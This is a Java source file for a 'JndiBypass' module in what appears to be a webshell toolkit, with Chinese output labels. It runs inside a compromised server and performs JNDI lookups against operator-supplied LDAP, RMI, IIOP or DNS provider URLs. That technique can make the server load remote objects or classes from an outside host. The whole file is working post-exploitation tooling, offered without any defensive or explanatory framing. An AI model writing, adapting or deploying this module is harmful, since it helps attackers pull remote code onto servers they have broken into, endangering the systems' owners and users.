package shells.plugins.java.assets;

import java.io.PrintWriter;
import java.io.StringWriter;
import java.nio.charset.Charset;   // JDK 1.6: StandardCharsets is Java 7+
import java.util.Hashtable;
import java.util.Map;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

/**
 * Server-side JNDI lookup for JndiBypass plugin.
 * loadPath: LDAP provider URL (e.g. ldap://127.0.0.1:389/) or full JNDI name for single lookup.
 * cmd: when non-empty with loadPath as provider URL, used as relative lookup name; otherwise combined behavior below.
 */
public class JndiBypassModule {

    private static final Charset UTF8 = Charset.forName("UTF-8");

    private Map session;

    public void setSession(Map session) {
        this.session = session;
    }

    public void setServletRequest(Object servletRequest) {
    }

    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[]) value, UTF8);
        }
        return value != null ? value.toString() : null;
    }

    private static void appendThrowable(StringBuilder sb, Throwable t) {
        sb.append(t.getClass().getName()).append(": ").append(t.getMessage()).append("\n");
        StringWriter sw = new StringWriter();
        t.printStackTrace(new PrintWriter(sw));
        sb.append(sw.toString());
    }

    private static String factoryForUrl(String url) {
        if (url == null) {
            return null;
        }
        String u = url.toLowerCase();
        if (u.startsWith("ldap:") || u.startsWith("ldaps:")) {
            return "com.sun.jndi.ldap.LdapCtxFactory";
        }
        if (u.startsWith("rmi:")) {
            return "com.sun.jndi.rmi.registry.RegistryContextFactory";
        }
        if (u.startsWith("iiop:") || u.startsWith("corbaname:")) {
            return "com.sun.jndi.cosnaming.CNCtxFactory";
        }
        if (u.startsWith("dns:")) {
            return "com.sun.jndi.dns.DnsContextFactory";
        }
        return null;
    }

    public byte[] jndiRun() {
        String loadPath = getString("loadPath");
        String cmd = getString("cmd");
        if (cmd == null) {
            cmd = getString("cmdLine");
        }

        StringBuilder result = new StringBuilder();
        result.append("=== JNDI \u7ed5\u8fc7 / Lookup ===\n");
        result.append("\u52a0\u8f7d\u8def\u5f84: ").append(loadPath != null ? loadPath : "").append("\n");
        result.append("\u547d\u4ee4/\u540d\u79f0: ").append(cmd != null ? cmd : "").append("\n\n");

        try {
            if (loadPath == null || loadPath.trim().isEmpty()) {
                if (cmd == null || cmd.trim().isEmpty()) {
                    result.append("[-] \u52a0\u8f7d\u8def\u5f84\u4e0e\u547d\u4ee4\u81f3\u5c11\u586b\u4e00\u9879\u3002\n");
                    return result.toString().getBytes(UTF8);
                }
                result.append("[*] \u4ec5\u547d\u4ee4\uff0c\u4f7f\u7528\u9ed8\u8ba4 InitialContext\n");
                lookupAndAppend(result, new InitialContext(), cmd.trim());
                return result.toString().getBytes(UTF8);
            }

            loadPath = loadPath.trim();
            String cmdTrim = cmd != null ? cmd.trim() : "";

            if (cmdTrim.isEmpty()) {
                result.append("[*] \u5355\u6b21 lookup\uff08\u5168\u540d/\u5b8c\u6574 URL\uff09\n");
                lookupAndAppend(result, new InitialContext(), loadPath);
                return result.toString().getBytes(UTF8);
            }

            if (loadPath.contains("://")) {
                String factory = factoryForUrl(loadPath);
                if (factory != null) {
                    Hashtable<Object, Object> env = new Hashtable<Object, Object>();
                    env.put(Context.INITIAL_CONTEXT_FACTORY, factory);
                    String url = loadPath.endsWith("/") ? loadPath : loadPath + "/";
                    env.put(Context.PROVIDER_URL, url);
                    result.append("[*] PROVIDER_URL=").append(url).append(" lookup(\"").append(cmdTrim).append("\")\n");
                    InitialContext ctx = new InitialContext(env);
                    lookupAndAppend(result, ctx, cmdTrim);
                } else {
                    result.append("[*] \u672a\u8bc6\u522b\u534f\u8bae\uff0c\u5c1d\u8bd5\u76f4\u63a5\u62fc\u63a5 lookup\n");
                    String combined = loadPath.endsWith("/") ? loadPath + cmdTrim : loadPath + "/" + cmdTrim;
                    lookupAndAppend(result, new InitialContext(), combined);
                }
            } else {
                String combined = loadPath.endsWith("/") ? loadPath + cmdTrim : loadPath + "/" + cmdTrim;
                result.append("[*] lookup(\"").append(combined).append("\")\n");
                lookupAndAppend(result, new InitialContext(), combined);
            }
        } catch (Throwable t) {
            result.append("[-] \u5931\u8d25: ");
            appendThrowable(result, t);
        }

        return result.toString().getBytes(UTF8);
    }

    private static void lookupAndAppend(StringBuilder result, Context ctx, String name) throws NamingException {
        Object obj = ctx.lookup(name);
        result.append("[+] \u7ed3\u679c: ").append(obj).append("\n");
        if (obj != null) {
            result.append("    \u7c7b\u578b: ").append(obj.getClass().getName()).append("\n");
        }
    }
}
